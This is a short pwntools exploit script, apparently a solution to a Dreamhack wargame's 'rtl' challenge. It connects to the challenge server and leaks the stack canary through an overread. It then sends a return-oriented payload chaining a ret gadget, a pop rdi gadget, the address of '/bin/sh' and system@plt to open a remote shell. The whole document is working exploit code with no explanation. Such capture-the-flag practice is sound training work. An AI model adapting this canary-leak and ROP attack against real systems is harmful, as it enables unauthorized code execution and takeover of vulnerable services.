from pwn import *

#p = process('./rtl')
p = remote('host1.dreamhack.games', 22347)
#gdb.attach(p, api=True)

buf = b"a"*57
p.sendafter(b'Buf: ',buf)
p.recvuntil(buf)
canary = u64(b"\x00"+p.recv(7))
log.info('Canary' +  hex(canary))

pop_rdi_ret = 0x0000000000400853 # ROPgadget --binary ./rtl | grep "pop rdi ; ret"
bin_sh = 0x400874 # search -t string /bin/sh
sys_plot = 0x00000000004005d0 # info func @plt
ret = 0x0000000000400285 # ROPgadget --binary=./rtl | grep ": ret"

payload = b"A"*56 + p64(canary) + b"A"*8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_plot)
p.sendafter(b'Buf: ', payload)

p.interactive()
